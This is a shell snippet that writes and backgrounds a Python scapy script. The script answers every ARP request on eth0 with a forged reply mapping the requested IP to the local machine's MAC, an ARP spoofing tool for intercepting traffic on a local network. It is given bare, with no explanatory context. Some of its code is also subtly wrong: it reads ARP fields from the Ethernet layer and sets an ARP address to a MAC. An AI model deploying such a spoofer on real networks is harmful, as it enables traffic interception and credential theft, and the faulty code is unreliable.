cat << 'EOF' > arp_resp.py
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
  # if arp request, then we need to fill this out to send back our mac as the response
  if ARP in packet and packet[ARP].op == 1:
    # config_values = get_config_values()
    ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)

    arp_response = ARP(pdst=macaddr)
    arp_response.op = 2
    arp_response.plen = 4
    arp_response.hwlen = 6
    arp_response.ptype = 0x800
    arp_response.hwtype = 0x1

    arp_response.hwsrc = macaddr
    arp_response.hwdst = packet[Ether].hwsrc

    arp_response.psrc = packet[Ether].pdst
    arp_response.pdst = packet[Ether].psrc

    response = ether_resp/arp_response

    sendp(response, iface="eth0")

def main():
  # We only want arp requests
  berkeley_packet_filter = "(arp[6:2] = 1)"
  # sniffing for one packet that will be sent to a function, while storing none
  while True:
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
  main()

EOF



chmod 750 ./arp_resp.py
nohup ./arp_resp.py &
